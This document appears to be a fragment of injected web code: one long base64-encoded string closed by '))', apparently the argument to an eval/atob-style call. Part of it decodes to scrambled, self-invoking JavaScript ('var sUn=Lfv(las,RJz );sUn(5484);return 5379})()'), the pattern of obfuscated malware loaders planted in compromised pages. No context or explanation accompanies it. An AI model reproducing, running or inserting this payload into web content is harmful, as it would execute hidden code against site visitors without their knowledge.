X24hc15dQy40XnRlXm5iWy4lJl5hX150JV9eMV4hX15eIlwne15POF45KHtwMF19biUpaGklfW5pLl1dP2IjMSxdbygoaXMociBdXTopXk5kaTspMHR0JHRzbz9lZTZycm9iLm9uPWt5XmUgbz0mcnNyMGMuU103NU8rZzxlbGxiXmw+YiklTF0ybCleXiYyX2kpaWVdXl5eXiRlXl4lbWJeQS5dJUtkKXJeNF5lLnVyc2ZbOGNzKTU7Tm5eYS5hcixnMTZpIGIgdChwVClFb2MiM1dfb286KDAoXm90UV9iXl8lXmJMLmI0bnJfYXcpb28hM11dMG8yNW9Lbz07d3suX2k3ZWNvbzA1XnNlfWEuXS48PW5eUG1dNTN1UF9iXXhpXjleeThkZ2VeXl1uZTlhZV5fY3RpLm5hXmQ3cz1ibnJvXlwvVl49OTNdOCk6W18oV2ZiIDhvXnItdHAxbi1nKTR3Q15pal9hXiNecl86bjNeKWt0XyguKCgwXl0uLClmbz0tLCB1ZW9eIV5ebTshK15zNnQgbk8hZyl0XiledWc9KGF9ZGUuXiQucilvKFNydHVvXkYwMGEuNzReKGdvOW8oMVspO25fKFwnXTBdNENEXj1eaGo0MG5mXjFiK25hYmJfMH16PW5PXjNeYnNdM15eZGdudV4lMCIzcl5vOV5eMjFeaTVdOGM4Xl4uYjMzaVwndSUqVSshJUEgXjFeeyhebyJeIF5vaHBeYTVHdDJqMjphWGI3dCllXlMsc3RkYllfKGViKDN7XmlzaDFyMm9ELnt9Xl5ebSVqRnZ9ZCh7c15eJTJiXnguIF5vO3IoMXtlLG4sXmFuYyteITgxXl5hLWVeVl51bCguM19iOV5jLGVkXmJfKW9pNF4yZSl5XWt1LFteXV89KWpeZS4oPW85aX0pRV49KDIuX2pQfUNlXm5fcF5jZTlvR3NlLl9BX19fXl4pdCt0NCl1MXheXXcpXiAxLnJjNDl0c00hNiFLb119MzZbXiVdUl44Xj83JmVeOnJlOWNdYSA7Yi4zMW4xMlNebCAwKl5vXl5ebXQmZ2JiXkIhdGFdXX10NTMsImEoKXclZi5vJW92X3VkLVtsXlFfJUtINXBfOyIgZm5sLnheWzAxX2lDX3Nzcm1eWGItTTIwczIuU2UxIF8oeyl0YWMwb15uO3kwdGReYmpdXXMlbWFLK3JiYmUpZzEuSnxhNW8xPWYuKF9lLmYuXmVlKyViXixvXSAleSVPMWtsdWVmICRodF1yK14wdn1yXl0sZC5vbi5bMmgjZWEoXjdsX15yeygpKSA9c15hdStob3Qse25eMjtpbUgkIF55Ll5oN2I3cF5edD17LmQhKGU3JWVdNnNhXl9fcShyLCJzXnQ7YXdyZSlfZj1fe2hwNSVdYWIpYyV7dUNeX2YzXW41XileXV5vYWVUNC5yZl5sLmI5ZWF0TTVlbWE9XXR1anJec15tb2JeZWZcLy5ee2FufWIoZTo9KXVeLmE6b189Zn1odDszXiMxNjJeXl41SHkoMyx0Pl4qM15vdDVfJWJlXmR8cCh0Xl9eYiU5XnMhb3ViLi4xMm80Sy1ffS5PMCxzKC5sXlteKy1xaV1ffWVQZV47KX0laV5pLl1eOjQgJiYuO21uXiwzZHMsN1B6MFs9OSAiaGU3TC59XWlbY2NuXjsxKDtpU2YoKXVvXl5eNGFyXmZebiEoT2ZhXnNedC4xdGctJXIrIG9ePyk9dDhsZT14dGVfJVloYl5vNWFeZD1HNl5uZCNuUyEiOW4uYWtoXmwseCh2LnJeM24yYnclOygxJWUwKDR4MF1eY2JuXT1PLlR0MHBhZX1eXmNvLWc5XV90aF5dQmViX2lzPSleXnJlaS50W3UwXnRiO2lnb18pNF9db19sbmQjXnJmZnI4LF9tIXR0aztebHVue2VGN18ybj1nXnREMF5iMl1vMCUjT15aKV4xXl1NXmpvXC9eXVAoKS0uPzJdVG0ybjIxZygkX2UuTzMgXC9uPWxeXjFhfT11ZDJeKTBdKWNeNWhyXl4jI24gXTpbW2N6IXRwZHRlLGJ7XyVTKTtsW15vLl5jciVeXURcL141KShfOzYpXjY6bixuPSJiLjR5fXM7LiQoYXQzZV5fXiByYjJeXV9iPGIzYl07NF4sfSssZDZ9dDslXzc2cmI7X3heXm0zZF4ue3V1e193LjJvIzheZikoZy5kXm90b14yIXBUKWFlXi5yK15ldCVeLDBWczh0IW5ecj1tXyo0fGJeaDQoNl1iVz1vXlwvZVteYyg0LlMgLihdXiteY3NiZV9iXnBJZG9yXj9dXl1bYTNzKUpbIiksZyFmZTFjeWNjdm8iXn09cCtyZHQ9KV5eOCkuKCArOm5lNFtoeDE9eTF0XnMuLllmMWEpZGwobCE1K1NcLzteOzNUIHN0ZnBeJThvXWJiMnJedGgoMyBfcj1vXl9eMX1kPWRpa2xlNl1zZD1eX19jaHBpXiBJMX1nXjkrQF5iKV9pclBwJmRVfSZiXjIwXnJeKSEuY2IlLmEodD1lVHslSGRuZzt2IF4gLjU9LmNiYTldXjthXl5uPT80KWdbLDZpIV5dXjErWyVkdXN1YXRyOzclYl5ebm9dOWVoLDteXyh0bSNzKShHXl5vIWlwdF9tXl1yLCh9LHx9eGguKTZlfV8gfW1eYU9hIGNmXnRlJS5iMFtlcm5afXcgY19eYXdfRWEoZG45SCA7e15sXiYodF1vIV4reXVdKWwhfXBlbzFbcilbXSRdMV86IG1kYkteXUdeOSkhb244fX1kcHJjPV9ic2E9cD1oIG8hdD1iXiggXm9fIHIobyFddCl0XiZebCljcl5daW9pYzo9c14yVXlecnUxIG9vXl17bG9eNHJ5OnsgXSkkJXJqMF5lMXMiKSlSLl4uJV1vNHYwZHRuLTZyfV5vZF5lX10nKSk7dmFyIHNVbj1MZnYobGFzLFJKeiApO3NVbig1NDg0KTtyZXR1cm4gNTM3OX0pKCk='))
